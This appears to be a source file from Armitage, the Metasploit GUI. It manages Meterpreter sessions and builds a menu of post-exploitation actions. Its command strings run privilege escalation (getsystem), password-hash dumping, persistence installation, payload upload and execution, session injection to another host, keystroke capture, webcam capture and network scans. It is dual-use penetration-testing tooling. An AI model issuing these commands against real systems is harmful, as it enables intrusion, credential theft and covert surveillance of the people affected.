
#
# this code maintains the client threads (one per meterpreter session) and
# the data structures for each meterpreter session.
#

import armitage.*;
import console.*;
import msf.*;

import javax.swing.*;

global('%sessions %handlers $handler');

sub session {
	if ($1 !in %sessions && $mclient !is $null) {
		%sessions[$1] = [new MeterpreterSession: $mclient, $1];
		[%sessions[$1] addListener: lambda(&parseMeterpreter)];		
	}

	return %sessions[$1];
}

sub oneTimeShow {
	%handlers[$1] = lambda({
		if ($0 eq "begin") {
			showError($2);
			%handlers[$command] = $null;
		}
	}, $command => $1);
}

# m_cmd("session", "command here")
sub m_cmd {
	if ($mclient is $null) {
		warn("Dropping: " . @_ . " - collab check not complete!");
		return;
	}

	local('$command $handler');
        $command = split('\s+', [$2 trim])[0];
	$handler = %handlers[$command];

	if ($handler !is $null) {
		[$handler execute: $1, [$2 trim]];
	}
	else {
		$handler = {};
	}

	[session($1) addCommand: $handler, "$2 $+ \n"];
}

sub parseMeterpreter {
	local('@temp $command $line $sid $token $response $data $command');

	# called with: sid, token, response 
	($sid, $token, $response) = @_;

	if ($token isa ^MeterpreterClient) {
		return;
	}

	$response = convertAll($3);
	$data = [Base64 decode: $response['data']];

	if ("*uploaded*:*->*" iswm $data) {
		# this is a hack to force the file browser to refresh when a file is uploaded
		m_cmd($sid, "ls");
	}
	else if ("[-]*Unknown command: *" iswm $data) {
		m_cmd($sid, "use stdapi");
		showError("Loading stdapi. Try command again");
		return;
	}

	$handler = $token;

	if ($handler !is $null && $0 eq "commandComplete") {
		local('$h');
		$h = $handler;
		[$h begin: $1, $data];
		@temp = split("\n", $data);
		foreach $line (@temp) {
			[$h update: $1, $line];
		}	
		[$h end: $1, $data];
	}
	else if ($handler !is $null && $0 eq "commandTimeout") {
		[$handler timeout: $1, $data];
	}
}

#
# this code creates and managers a meterpreter tab.
#
sub createMeterpreterTab {
        local('$session $result $thread $console $old');

        $session = session($1);

	# set up a meterpreter console window
        $console = [new Console: $preferences];
	logCheck($console, sessionToHost($1), "meterpreter_ $+ $1");
	[$console setPopupMenu: lambda(&meterpreterPopup, $session => sessionData($1), $sid => $1)];

	# tab completion for Meterpreter... :D
	[new TabCompletion: $console, $client, $1, "session.meterpreter_tabs"];

	# set up a listener to read input from the console and dump output back to it.
	if ("*Windows*" !iswm sessionToOS($1) || ($REMOTE && $mclient is $client)) {
		[new MeterpreterClient: $console, $session, $null];
	}
	else {
		[new MeterpreterClient: $console, $session, newInstance(^java.awt.event.ActionListener, lambda({ createShellTab($sid); }, $sid => $1))];
	}

        [$frame addTab: "Meterpreter $1", $console, $null];
}

sub meterpreterPopup {
        local('$popup');
        $popup = [new JPopupMenu];

	showMeterpreterMenu($popup, \$session, \$sid);
	
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showMeterpreterMenu {
	local('$j $platform');
	
	$platform = lc($session['platform']);

	if ("*win*" iswm $platform) {
		$j = menu($1, "Access", 'A');
	
		item($j, "Duplicate", 'D', lambda({
			meterpreterPayload("meterpreter-upload.exe", lambda({
				if ($1 eq "generate -t exe -f meterpreter-upload.exe\n") {
					m_cmd($sid, "run uploadexec -e meterpreter-upload.exe");
				}
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Migrate Now!", 'M', lambda({
			oneTimeShow("run");
			m_cmd($sid, "run migrate -f");
		}, $sid => "$sid"));

		item($j, "Escalate Privileges", 'E', lambda({
			%handlers["getsystem"] = {
				this('$safe');

				if ($0 eq "begin" && "*Unknown command*getsystem*" iswm $2) {
					if ($safe is $null) {
						$safe = 1;
						m_cmd($1, "use priv");
						m_cmd($1, "getsystem -t 0");
					}
					else {
						$safe = $null;
						showError("getsystem is not available here");
					}
				}
				else if ($0 eq "begin") {
					showError($2);
				}
				else if ($0 eq "end") {
					%handlers["getsystem"] = $null;
					$handler = $null;
				}
			};

			m_cmd($sid, "getsystem -t 0");
		}, $sid => "$sid"));

		item($j, "Dump Hashes", "D", lambda({ 
			m_cmd($sid, "hashdump");
		}, $sid => "$sid"));

		item($j, "Persist", 'P', lambda({
			thread(lambda({
				cmd_safe("setg LPORT", lambda({
					local('$p');
					$p = [$3 trim];
					if ($p ismatch 'LPORT => (\d+)') {
						oneTimeShow("run");
						local('$port');
						$port = matched()[0];
						elog("ran persistence on " . sessionToHost($sid) . " ( $+ $port $+ )");
						m_cmd($sid, "run persistence -S -U -i 5 -p $port");
					}
				}, \$sid));
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Pass Session", 'S', lambda({
			local('$host $port');
			($host, $port) = split('[:\s]', ask("Send session to which listening host:port?"));
			if ($host ne "" && $port ne "") {
				oneTimeShow("run");
				warn("$host and $port");
				m_cmd($sid, "run multi_meter_inject -mr $host -p $port");
			}
		}, $sid => "$sid"));
	}
			
	$j = menu($1, "Interact", 'I');

			if ("*win*" iswm $platform && (!$REMOTE || $mclient !is $client)) {
				item($j, "Command Shell", 'C', lambda({ createShellTab($sid); }, $sid => "$sid"));
			}

			item($j, "Meterpreter Shell", 'M', lambda({ createMeterpreterTab($sid); }, $sid => "$sid"));

			if ("*win*" iswm $platform && !$REMOTE) {
				item($j, "Run VNC", 'V', lambda({ m_cmd($sid, "run vnc -t -i"); }, $sid => "$sid"));
			}

	$j = menu($1, "Explore", 'E');
			item($j, "Browse Files", 'B', lambda({ createFileBrowser($sid); }, $sid => "$sid"));
			item($j, "Show Processes", 'P', lambda({ createProcessBrowser($sid); }, $sid => "$sid"));
			if ("*win*" iswm $platform) {
				item($j, "Key Scan", 'K', lambda({ createKeyscanViewer($sid); }, $sid => "$sid"));
			}

			if (!$REMOTE || $mclient !is $client) {
				item($j, "Screenshot", 'S', createScreenshotViewer("$sid"));
				item($j, "Webcam Shot", 'W', createWebcamViewer("$sid"));
			}

			separator($j);

			item($j, "Post Modules", 'M', lambda({ showPostModules($sid); }, $sid => "$sid"));

	$j = menu($1, "Pivoting", 'P');
			item($j, "Setup...", 'A', setupPivotDialog("$sid"));
			item($j, "Remove", 'R', lambda({ killPivots($sid, $session); }, \$session, $sid => "$sid"));

	if ("*win*" iswm $platform) {
		item($1, "ARP Scan...", 'A', setupArpScanDialog("$sid"));
	}

	separator($1);

	item($1, "Kill", 'K', lambda({ cmd_safe("sessions -k $sid"); }, $sid => "$sid"));
}

sub launch_msf_scans {
	local('@modules $1 $hosts');

	@modules = filter({ return iff("*_version" iswm $1, $1); }, @auxiliary);
	push(@modules, "scanner/discovery/udp_sweep");
	push(@modules, "scanner/netbios/nbname");
	push(@modules, "scanner/dcerpc/tcp_dcerpc_auditor");
	push(@modules, "scanner/mssql/mssql_ping");

	$hosts = iff($1 is $null, ask("Enter range (e.g., 192.168.1.0/24):"), $1);

	thread(lambda({
		local('%options $scanner $count $pivot');

		if ($hosts !is $null) {
			# we don't need to set CHOST as the discovery modules will honor any pivots already in place
			%options = %(THREADS => iff(isWindows(), 2, 8), RHOSTS => $hosts);

			foreach $scanner (@modules) {
				call($client, "module.execute", "auxiliary", $scanner, %options);
				$count++;
				yield 250;
			}

			elog("launched $count discovery modules at: $hosts");
			showError("Launched $count discovery modules");
		}
	}, \$hosts, \@modules));
}

sub enumerateMenu {
	item($1, "MSF Scans", 'S', &launch_msf_scans);
}

sub setHostInfo {
	%hosts[$1]['os_name'] = $2;
	%hosts[$1]['os_flavor'] = $3;
	%hosts[$1]['os_match'] = $4;
	call($client, "db.report_host", %(host => $1, os_name => $2, os_flavor => $3));
	$FIXONCE = 1;
}
